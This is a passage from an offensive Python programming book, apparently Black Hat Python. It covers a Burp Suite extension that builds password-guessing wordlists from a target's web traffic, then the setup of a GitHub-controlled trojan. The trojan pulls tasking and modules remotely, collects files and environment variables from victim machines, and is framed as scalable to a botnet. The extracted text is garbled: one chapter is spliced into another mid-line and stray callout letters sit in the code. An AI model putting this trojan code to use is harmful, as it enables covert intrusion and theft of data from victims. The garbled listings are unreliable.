from datetime import datetime
from HTMLParser import HTMLParser
class TagStripper(HTMLParser):
def __init__(self):
HTMLParser.__init__(self)
self.page_text = []
def handle_data(self, data):
u self.page_text.append(data)
def handle_comment(self, data):
v self.handle_data(data)
def strip(self, html):
self.feed(html)
w return " ".join(self.page_text)
class BurpExtender(IBurpExtender, IContextMenuFactory):
def registerExtenderCallbacks(self, callbacks):
self._callbacks = callbacks
self._helpers = callbacks.getHelpers()
self.context = None
self.hosts = set()
# Start with something we know is common
x self.wordlist = set(["password"])
# we set up our extension
callbacks.setExtensionName("BHP Wordlist")
callbacks.registerContextMenuFactory(self)
return
def createMenuItems(self, context_menu):
self.context = context_menu
menu_list = ArrayList()
menu_list.add(JMenuItem("Create Wordlist", ¬
actionPerformed=self.wordlist_menu))
return menu_list
94 Chapter 6
The code in this listing should be pretty familiar by now. We start by
importing the required modules. A helper TagStripper class will allow us
to strip the HTML tags out of the HTTP responses we process later on.
Its handle_data function stores the page text u in a member variable. We
also define handle_comment because we want the words stored in developer
comments to be added to our password list as well. Under the covers,
handle_comment just calls handle_data v (in case we want to change how we
process page text down the road).
The strip function feeds HTML code to the base class, HTMLParser, and
returns the resulting page text w, which will come in handy later. The rest
is almost exactly the same as the start of the bhp_bing.py script we just fin-
ished. Once again, the goal is to create a context menu item in the Burp UI.
The only thing new here is that we store our wordlist in a set, which ensures
that we don’t introduce duplicate words as we go. We initialize the set with
everyone’s favorite password, “password” x, just to make sure it ends up in
our final list.
Now let’s add the logic to take the selected HTTP traffic from Burp and
turn it into a base wordlist.
def wordlist_menu(self,event):
# grab the details of what the user clicked
http_traffic = self.context.getSelectedMessages()
for traffic in http_traffic:
http_service = traffic.getHttpService()
host = http_service.getHost()
u self.hosts.add(host)
http_response = traffic.getResponse()
if http_response:
v self.get_words(http_response)
self.display_wordlist()
return
def get_words(self, http_response):
headers, body = http_response.tostring().split('\r\n\r\n', 1)
# skip non-text responses
w if headers.lower().find("content-type: text") == -1:
return
tag_stripper = TagStripper()
x page_text = tag_stripper.strip(body)
Extending Burp Proxy 95
y words = re.findall("[a-zA-Z]\w{2,}", page_text)
for word in words:
# filter out long strings
if len(word) /chapter7.git
$ git push origin master
Here, we’ve created the initial structure for our repo. The config direc-
tory holds configuration files that will be uniquely identified for each tro-
jan. As you deploy trojans, you want each one to perform different tasks and
each trojan will check out its unique configuration file. The modules direc-
tory contains any modular code that you want the trojan to pick up and
then execute. We will implement a special import hack to allow our trojan
to import libraries directly from our GitHub repo. This remote load capa-
bility will also allow you to stash third-party libraries in GitHub so you don’t
have to continually recompile your trojan every time you want to add new
functionality or dependencies. The data directory is where the trojan will
check in any collected data, keystrokes, screenshots, and so forth. Now let’s
create some simple modules and an example configuration file.
1. The repo where this library is hosted is here: https://github.com/copitux/python-github3/.
102 Chapter 7
creating Modules
In later chapters, you will do nasty business with your trojans, such as log-
ging keystrokes and taking screenshots. But to start, let’s create some simple
modules that we can easily test and deploy. Open a new file in the modules
directory, name it dirlister.py, and enter the following code:
import os
def run(**args):
print "[*] In dirlister module."
files = os.listdir(".")
return str(files)
This little snippet of code simply exposes a run function that lists all
of the files in the current directory and returns that list as a string. Each
module that you develop should expose a run function that takes a variable
number of arguments. This enables you to load each module the same way
and leaves enough extensibility so that you can customize the configuration
files to pass arguments to the module if you desire.
Now let’s create another module called environment.py.
import os
def run(**args):
print "[*] In environment module."
return str(os.environ)
This module simply retrieves any environment variables that are set on
the remote machine on which the trojan is executing. Now let’s push this
code to our GitHub repo so that it is useable by our trojan. From the com-
mand line, enter the following code from your main repository directory:
$ git add .
$ git commit -m "Adding new modules"
$ git push origin master
Username: ********
Password: ********
You should then see your code getting pushed to your GitHub repo; feel
free to log in to your account and double-check! This is exactly how you can
continue to develop code in the future. I will leave the integration of more
complex modules to you as a homework assignment. Should you have a hun-
dred deployed trojans, you can push new modules to your GitHub repo and
QA them by enabling your new module in a configuration file for your local
version of the trojan. This way, you can test on a VM or host hardware that
you control before allowing one of your remote trojans to pick up the code
and use it.
GitHub Command and Control 103
trojan configuration
We want to be able to task our trojan with performing certain actions over
a period of time. This means that we need a way to tell it what actions to
perform, and what modules are responsible for performing those actions.
Using a configuration file gives us that level of control, and it also enables
us to effectively put a trojan to sleep (by not giving it any tasks) should we
choose to. Each trojan that you deploy should have a unique identifier,
both so that you can sort out the retrieved data and so that you can control
which trojan performs certain tasks. We’ll configure the trojan to look in
the config directory for TROJANID.json, which will return a simple JSON
document that we can parse out, convert to a Python dictionary, and then
use. The JSON format makes it easy to change configuration options as
well. Move into your config directory and create a file called abc.json with
the following content:
[
{
"module" : "dirlister"
},
{
"module" : "environment"
}
]
This is just a simple list of modules that we want the remote trojan to
run. Later you’ll see how we read in this JSON document and then iterate
over each option to get those modules loaded. As you brainstorm module
ideas, you may find that it’s useful to include additional configuration
options such as execution duration, number of times to run the selected
module, or arguments to be passed to the module. Drop into a command
line and issue the following command from your main repo directory.
$ git add .
$ git commit -m "Adding simple config."
$ git push origin master
Username: ********
Password: ********
This configuration document is quite simple. You provide a list of
dictionaries that tell the trojan what modules to import and run. As you
build up your framework, you can add additional functionality in these
configuration options, including methods of exfiltration, as I show you in
Chapter 9. Now that you have your configuration files and some simple
modules to run, you’ll start building out the main trojan piece.
104 Chapter 7
Building a gitHub-aware trojan
Now we’re going to create the main trojan that will suck down configura-
tion options and code to run from GitHub. The first step is to build the
necessary code to handle connecting, authenticating, and communicating
to the GitHub API. Let’s start by opening a new file called git_trojan.py and
entering the following code:
import json
import base64
import sys
import time
import imp
import random
import threading
import Queue
import os
from github3 import login
u trojan_id = "abc"
trojan_config = "%s.json" % trojan_id
data_path = "data/%s/" % trojan_id
trojan_modules= []
configured = False
task_queue = Queue.Queue()
This is just some simple setup code with the necessary imports, which
should keep our overall trojan size relatively small when compiled. I say
relatively because most compiled Python binaries using py2exe2 are around
7MB. The only thing to note is the trojan_id variable u that uniquely iden-
tifies this trojan. If you were to explode this technique out to a full botnet,